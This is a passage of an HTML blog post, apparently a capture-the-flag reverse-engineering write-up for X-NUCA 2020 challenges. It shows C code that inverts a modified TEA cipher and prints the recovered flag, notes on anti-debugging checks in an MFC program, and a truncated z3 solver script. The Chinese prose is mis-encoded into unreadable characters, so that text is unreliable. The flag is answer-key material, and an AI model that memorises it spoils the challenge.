class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%#x "</span>, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(ida_chars+i));</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*unsigned int v32 = 0xb061f013;</span></span><br><span class="line"><span class="comment">unsigned int v28 = 0xb3c8567e;</span></span><br><span class="line"><span class="comment">unsigned int v25 = 0x9952a3c7;</span></span><br><span class="line"><span class="comment">unsigned int v29 = 0x451c2d3f;</span></span><br><span class="line"><span class="comment">unsigned int v26 = 0x3ee32267;</span></span><br><span class="line"><span class="comment">unsigned int v27 =  0xe3e22b3e;</span></span><br><span class="line"><span class="comment">unsigned int v10 = 0x43e5a250;</span></span><br><span class="line"><span class="comment">unsigned int v30 = 0x59b28ed0;</span></span><br><span class="line"><span class="comment">unsigned int v31 = 0xf8649dc;</span></span><br><span class="line"><span class="comment">unsigned int v11 = 0x9bf4d083;</span></span><br><span class="line"><span class="comment">unsigned int v12 = 0x8a578110;</span></span><br><span class="line"><span class="comment">unsigned int v13 = 0x8604ec4f;</span></span><br><span class="line"><span class="comment">unsigned int v14 = 0x2eb5a27f;</span></span><br><span class="line"><span class="comment">unsigned int v15 = 0x1217ddf3;</span></span><br><span class="line"><span class="comment">unsigned int v16 = 0x93c9b253;</span></span><br><span class="line"><span class="comment">unsigned int v33 = 0xdc7f8e43;*/</span></span><br></pre></td></tr></table></figure><p>è§£å¯†ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v32 = <span class="number">0xb061f013</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v28 = <span class="number">0xb3c8567e</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v25 = <span class="number">0x9952a3c7</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v29 = <span class="number">0x451c2d3f</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v26 = <span class="number">0x3ee32267</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v27 = <span class="number">0xe3e22b3e</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v10 = <span class="number">0x43e5a250</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v30 = <span class="number">0x59b28ed0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v31 = <span class="number">0xf8649dc</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v11 = <span class="number">0x9bf4d083</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v12 = <span class="number">0x8a578110</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v13 = <span class="number">0x8604ec4f</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v14 = <span class="number">0x2eb5a27f</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v15 = <span class="number">0x1217ddf3</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v16 = <span class="number">0x93c9b253</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v33 = <span class="number">0xdc7f8e43</span>;</span><br><span class="line"><span class="comment">//unsigned int v33 = 0;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v17 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v40 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v18 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> ans[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ans1[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> v19;</span><br><span class="line"><span class="keyword">int</span> v34 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">ans[<span class="number">12</span>] = <span class="number">4</span>;</span><br><span class="line">ans[<span class="number">8</span>] = <span class="number">3</span>;</span><br><span class="line">ans[<span class="number">4</span>] = <span class="number">2</span>;</span><br><span class="line">ans[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">ans1[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line">ans1[<span class="number">2</span>] = <span class="number">3</span>;</span><br><span class="line">ans1[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">ans1[<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">v17 = <span class="number">0x8FF34781</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">*(_int8 *)&amp;v18 = v17 &gt;&gt; <span class="number">2</span>; <span class="comment">//LOBYTE</span></span><br><span class="line"> v19 = (((v32 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v16) + (<span class="number">4</span> * v32 ^ (v16 &gt;&gt; <span class="number">5</span>))) ^ ((*((_int32 *)ans1 + <span class="number">5</span></span><br><span class="line">                                                                       + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xF</span>) &amp; <span class="number">3</span>)</span><br><span class="line">                                                                       - <span class="number">5</span>) ^ v16)</span><br><span class="line">                                                                    + (v32 ^ v17));</span><br><span class="line">v33 = v33-v19;</span><br><span class="line"> v16 -= (((v33 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v15) + (<span class="number">4</span> * v33 ^ (v15 &gt;&gt; <span class="number">5</span>))) ^ ((*((_int32 *)ans1 + <span class="number">5</span></span><br><span class="line">                                                                        + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xE</span>) &amp; <span class="number">3</span>)</span><br><span class="line">                                                                        - <span class="number">5</span>) ^ v15)</span><br><span class="line">                                                                     + (v33 ^ v17));</span><br><span class="line">                                                                     </span><br><span class="line">v15 -= (((v16 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v14) + (<span class="number">4</span> * v16 ^ (v14 &gt;&gt; <span class="number">5</span>))) ^ ((*((_int32 *)ans1 + <span class="number">5</span></span><br><span class="line">                                                                        + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xD</span>) &amp; <span class="number">3</span>)</span><br><span class="line">                                                                        - <span class="number">5</span>) ^ v14)</span><br><span class="line">                                                                     + (v16 ^ v17));</span><br><span class="line">v14 -= ((*((_int32 *)ans1 + <span class="number">5</span> + ((v17 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v13) + (v15 ^ v17)) ^ (((v15 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v13)</span><br><span class="line">                                                                                   + (<span class="number">4</span> * v15 ^ (v13 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v13 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xB</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v12) + (v14 ^ v17)) ^ (((v14 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v12) + (<span class="number">4</span> * v14 ^ (v12 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v12 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)v18 ^ <span class="number">0xA</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v11) + (v13 ^ v17)) ^ (((v13 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v11) + (<span class="number">4</span> * v13 ^ (v11 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v11 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">9</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v31) + (v12 ^ v17)) ^ (((v12 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v31) + (<span class="number">4</span> * v12 ^ (v31 &gt;&gt; <span class="number">5</span>)));<span class="comment">////</span></span><br><span class="line">v31 -= (((*((_int32 *)ans1 + <span class="number">5</span> + ((v17 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v30) + (v11 ^ v17)) ^ (((v11 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v30)</span><br><span class="line">                                                                                   + (<span class="number">4</span> * v11 ^ (v30 &gt;&gt; <span class="number">5</span>))));</span><br><span class="line"><span class="comment">//v18 = v31 + (((*((_int32 *)ans1 + 5 + ((v17 &gt;&gt; 2) &amp; 3) - 5) ^ v30) + (v11 ^ v17)) ^ (((v11 &gt;&gt; 3) ^ 16 * v30) + (4 * v11 ^ (v30 &gt;&gt; 5))));</span></span><br><span class="line">v30 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">7</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v10) + (v31 ^ v17)) ^ (((v31 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v10) + (<span class="number">4</span> * v31 ^ (v10 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v10 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">6</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v27) + (v30 ^ v17)) ^ (((v30 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v27) + (<span class="number">4</span> * v30 ^ (v27 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v27 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">5</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v26) + (v10 ^ v17)) ^ (((v10 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v26) + (<span class="number">4</span> * v10 ^ (v26 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v26 -= ((*((_int32 *)ans1 + <span class="number">5</span> + ((v17 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v29) + (v27 ^ v17)) ^ (((v27 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v29) + (<span class="number">4</span> * v27 ^ (v29 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v29 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">3</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v25) + (v26 ^ v17)) ^ (((v26 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v25) + (<span class="number">4</span> * v26 ^ (v25 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v25 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">2</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v28) + (v29 ^ v17)) ^ (((v29 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v28) + (<span class="number">4</span> * v29 ^ (v28 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v28 -= ((*((_int32 *)ans1 + <span class="number">5</span> + (((<span class="keyword">unsigned</span> __int8)(v17 &gt;&gt; <span class="number">2</span>) ^ <span class="number">1</span>) &amp; <span class="number">3</span>) - <span class="number">5</span>) ^ v32) + (v25 ^ v17)) ^ (((v25 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v32) + (<span class="number">4</span> * v25 ^ (v32 &gt;&gt; <span class="number">5</span>)));</span><br><span class="line">v32 -= (((v28 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v33) + (<span class="number">4</span> * v28 ^ (v33 &gt;&gt; <span class="number">5</span>))) ^ ((v33 ^ *(_int32 *)(ans + <span class="number">20</span> + (v17 &amp; <span class="number">0xC</span>) - <span class="number">20</span>)) + (v28 ^ v17));</span><br><span class="line">v17 += <span class="number">0x61C88647</span>;</span><br><span class="line">&#125;<span class="keyword">while</span>(v17 != <span class="number">0</span>);</span><br><span class="line">v34++;</span><br><span class="line">&#125;<span class="keyword">while</span>(v34 != <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"good!"</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥é€šè¿‡è°ƒè¯•çª—å£å–å‡ºçš„è§£å¯†æ•°æ®ï¼Œç„¶åæ‰“å°å‡ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> a[] = &#123;<span class="number">0x67616c66</span>, <span class="number">0x6330447b</span>, <span class="number">0x37306261</span>,<span class="number">0x35346146</span>, <span class="number">0x36623241</span>,</span><br><span class="line"><span class="number">0x62376646</span>, <span class="number">0x41364541</span>, <span class="number">0x41624261</span>, <span class="number">0x64354635</span>,</span><br><span class="line"><span class="number">0x43336263</span>, <span class="number">0x43446639</span>, <span class="number">0x66613545</span>, <span class="number">0x34354665</span>,</span><br><span class="line"><span class="number">0x38434144</span>, <span class="number">0x30354138</span>, <span class="number">0x7d413339</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, *(((<span class="keyword">char</span> *)&amp;a[i])+j));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;D0cab07Fa45A2b6Ff7bAE6AaBbA5F5dcb3C9fDCE5afeF54DAC88A5093A&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­æ˜¯sub_11E40è¿™ä¸ªå‡½æ•°å¯¹ç¨‹åºæµç¨‹è¿›è¡Œäº†ä¸€äº›éªšæ“ä½œï¼Œå¥½åƒæ˜¯hookã€‚</p><p>psï¼šåé¢çœ‹åˆ«äººçš„wpå­¦ä¹ æˆ‘æ‰çŸ¥é“è‡ªå·±é€†å‘çš„è¿™ä¸ªç®—æ³•æ˜¯ä¸€ä¸ªé­”æ”¹çš„teaï¼Œç„¶åé‚£ä¸ªéªšæ“ä½œæ˜¯hookäº†ç¨‹åºçš„memcmpå‡½æ•°ã€‚</p><h1 id="UnravelMFC"><a href="#UnravelMFC" class="headerlink" title="UnravelMFC"></a>UnravelMFC</h1><p><strong>psï¼šidaåŠ¨è°ƒæ‰“patchåçš„ç¨‹åºä¼šé—ªé€€å—ã€‚ã€‚</strong></p><p>è¿™ä¸ªé¢˜å¯¹äºæˆ‘æˆ‘ç°åœ¨çš„çŸ¥è¯†å‚¨å¤‡æ„Ÿè§‰è€ƒçš„ä¸œè¥¿è¿˜æ˜¯æŒºå¤šçš„ã€‚</p><p>é¦–å…ˆç®—æ³•ï¼šRC4ï¼Œbase64çš„ç®€å•æ”¹åŠ¨ï¼Œæ”¹äº†deltaçš„teaã€‚</p><p>ç„¶åè¯´è¯´ç¨‹åºçš„ä¸€äº›å‘ï¼Œå¼€å§‹ä½¿ç”¨å¦‚ä¸‹çš„å‡½æ•°æ‰§è¡Œä¸€ä¸ªå‡½æ•°æŒ‡é’ˆæ•°ç»„çš„æ‰€æœ‰å‡½æ•°ï¼Œé‡Œé¢åŒ…æ‹¬äº†smcï¼Œå˜æ¢æ•°æ®ï¼Œå’Œåè°ƒè¯•æ£€æµ‹(ç®€å•çš„<strong>*(_BYTE *)(__readfsdword(0x30u) + 2)</strong>ï¼‰ï¼š</p><p><img src="/2020/10/31/X-nuca-2020/image-20201212112326826.png" alt="image-20201212112326826"></p><p>å¦å¤–å°±æ˜¯ä¸€ä¸ªåè°ƒè¯•æˆ‘æ‰¾äº†å¥½ä¹…ï¼Œä¸€åº¦æ€€ç–‘æ˜¯idaç‰ˆæœ¬çš„bugï¼Œæ¯æ¬¡è°ƒè¯•åˆ°ä¸€ä¸ªåœ°æ–¹å°±é—ªé€€ï¼Œä¸€ç›´è·Ÿæœ€åè·Ÿåˆ°åº“é‡Œçš„ä¸€ä¸ªåˆ›å»ºçª—å£å‡½æ•°ï¼Œç„¶åå°±é€€å‡ºäº†ï¼Œä½†ä¸ºä»€ä¹ˆå‘¢ã€‚ã€‚åé¢æ‰å‘ç°æ˜¯åœ¨ä¸€ä¸ªå‡½æ•°åˆå§‹åŒ–çª—å£æ—¶çš„å‡½æ•°ç”¨äº†<strong>*(_BYTE *)(__readfsdword(0x30u) + 2)</strong>æ£€æµ‹è°ƒè¯•ï¼Œå¦‚æœå¤„äºè°ƒè¯•çŠ¶æ€å°±ä¸ä¼šåˆå§‹åŒ–è¿™ä¸ªçª—å£äº†ï¼Œç„¶åè°ƒç”¨ExitProcessé€€å‡ºç¨‹åºã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213155507714.png" alt="image-20201213155507714"></p><p>ä»è¿™ä¸ªå‡½æ•°å‘ä¸Šæ‰¾è°ƒç”¨ï¼šå¯ä»¥çœ‹åˆ°æ¶ˆæ¯å€¼0x110ï¼Œä¸€äº›<strong>RegisterWindowsMessageW</strong>å‡½æ•°åå‡ºç°å¯¹è¯æ¡†è¿‡ç¨‹å¤„ç†å‡½æ•°ï¼ˆDialogFuncï¼‰ã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213160502370.png" alt="image-20201213160502370"></p><p><img src="/2020/10/31/X-nuca-2020/image-20201213155933860.png" alt="image-20201213155933860"></p><p>æ­¤æ—¶æˆ‘åˆæƒ³åˆ°æ­£åœ¨åšçš„å¦å¤–ä¸€ä¸ªMFCç¨‹åºï¼Œé‚£æ‰¾ä¸»è¦çš„å¯¹è¯æ¡†åˆå§‹åŒ–å‡½æ•°æ˜¯ä¸æ˜¯ä¹Ÿå¯ä»¥æ‰¾å‘¢ï¼Œè¯•äº†ä¸€ä¸‹ï¼šç¡®å®å¯è¡Œã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213161554990.png" alt="image-20201213161554990"></p><p>æ¥ç€ä¸Šé¢é‚£ä¸ªç”¨å‡½æ•°æŒ‡é’ˆè°ƒç”¨çš„å‡½æ•°ï¼šä¸€ä¸ªç®€å•çš„åè°ƒè¯•ï¼Œè™½ç„¶ç®€å•ï¼Œä½†æ„Ÿè§‰ä¸å¥½å‘ç°ã€‚ã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201212114250004.png" alt="image-20201212114250004"></p><p><img src="/2020/10/31/X-nuca-2020/image-20201212114424506.png" alt="image-20201212114424506"></p><p>ä¸Šé¢è¯´åˆ°é‚£ä¸ªåè°ƒè¯•ä¸å¥½å‘ç°ï¼Œä½†å…¶å®æœ‰ä¸€ä¸ªæŸ¥ç¨‹åºé€€å‡ºåŸå› çš„åŠæ³•ï¼Œé‚£å°±æ˜¯ä¸æ–­è·Ÿè¸ªï¼šä¸‹é¢æ˜¯é€€å‡ºå‰æˆ‘è·Ÿåˆ°çš„ä¸€ä¸ªAPIï¼š</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213163744884.png" alt="image-20201213163744884"></p><p><a href="https://www.gladir.com/CODER/CWINDOWS/createdialogindirectparamw.htm" target="_blank" rel="noopener">å‡½æ•°è§£é‡Š</a>ï¼Œå…¶å®è¿™ä¸ªå‡½æ•°å°±ç±»ä¼¼DialogBoxParamA()å‡½æ•°ï¼Œç”¨å¯¹è¯æ¡†çš„æ¨¡æ¿åˆ›å»ºæ¨¡æ€å¯¹è¯æ¡†ã€‚è€Œçª—å£è¿‡ç¨‹å‡½æ•°æŒ‡é’ˆåœ¨ç¬¬å››ä¸ªå‚æ•°ã€‚ã€‚è¿™ä¹Ÿæ˜¯æˆ‘ä»¬å…³å¿ƒçš„å…³é”®å‡½æ•°ï¼Œä¸‹ä¸ªæ–­ç‚¹ã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201213163854906.png" alt="image-20201213163854906"></p><p>ç„¶åå°±æ˜¯ä¸ºä»€ä¹ˆç¨‹åºè¦è¾“å…¥å­—ç¬¦é•¿åº¦ä¸º66æ‰ä¼šenableç¡®å®šæŒ‰é’®ï¼Œä½†ä¸ºä»€ä¹ˆåªèƒ½è¾“å…¥63ä¸ªå­—ç¬¦å‘¢ï¼Œï¼Œè¿™ä¹Ÿæ˜¯æˆ‘åœ¨åšé¢˜æ—¶ä¸€ç›´æƒ³çš„é—®é¢˜ï¼Œç„¶åå½“æ—¶ä¹Ÿå°±ä¸æƒ³é€†ä¸‹å»äº†ã€‚</p><p>è€Œå½“æˆ‘åœ¨è¾“å…¥æ¡†è¾“å…¥æ­£ç¡®çš„flagæ—¶è¿™ä¸ªè¾“å…¥é•¿åº¦åˆå¯ä»¥æ˜¯66ï¼Œéš¾é“è¿˜æœ‰æ£€æŸ¥æœºåˆ¶ã€‚ã€‚æ‰¾äº†åŠå¤©æ²¡æœ‰æ‰¾åˆ°ï¼Œåé¢å‘ç°æ˜¯é‚£ä¸ªæ–‡æœ¬æ¡†æ˜¯æ ¹æ®æˆ‘è¾“å…¥çš„å­—ç¬¦å®½åº¦æ¥å†³å®šèƒ½è¾“å…¥å¤šå°‘å†…å®¹ã€‚ã€‚ã€‚å› ä¸ºæ¯”èµ›æ—¶æˆ‘è¾“å…¥çš„å…¨æ˜¯1ï¼Œè€Œå­—ç¬¦1æ¯”è¾ƒå®½ï¼Œè¿™é‡Œè¾“å…¥å…¨æ˜¯içš„è¯èƒ½å®¹çº³çš„å°±å¤šäº†ã€‚è¿™åº”è¯¥æ˜¯è®¾ç½®äº†è¾“å…¥æ¡†çš„ä¸€ä¸ªå±æ€§å§ã€‚</p><p><img src="/2020/10/31/X-nuca-2020/image-20201212115832156.png" alt="image-20201212115832156"></p><p>å‰©ä¸‹å¯¹äºç¨‹åºçš„å°±æ˜¯mfcæ¶ˆæ¯å¯¹åº”çš„å¤„ç†å‡½æ•°çš„å­¦ä¹ ã€‚ç„¶åé€†å‘2éƒ¨åˆ†è§£å¯†ã€‚</p><p>è¿™é‡Œåªè¯´ä¸€ä¸‹æˆ‘åœ¨pythoné€†teaåŠ å¯†æ—¶é‡åˆ°çš„å‘ï¼Œå› ä¸ºpythonä¸åƒCè¯­è¨€ï¼Œintå‹æ•°æ®çš„è¯å°±å›ºå®šæ˜¯4ä¸ªå­—èŠ‚ï¼Œpythonå°±æ˜¯ä½œä¸ºä¸€ä¸ªå¤§æ•°å¤„ç†ï¼Œæ‰€ä»¥æ¯æ¬¡çš„æ•°æ®æˆ‘ä»¬éƒ½è¦<strong>&amp;0xffffffff</strong>å–ä½4å­—èŠ‚æ•°æ®ã€‚</p><p>è§£å¯†è„šæœ¬:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">v13, v16, v17 = BitVecs(<span class="string">'v13 v16 v17'</span>, <span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">v14 = <span class="number">0x2F9970FF</span></span><br><span class="line">v15 = <span class="number">0xDF3634AE</span></span><br><span class="line">s.add(v16 - v13 == <span class="number">0x3F66B755B4490579</span>)</span><br><span class="line">s.add(v13 + v17 == <span class="number">0x162F924623D2CAE0</span>)</span><br><span class="line">s.add(v17 - v16 == <span 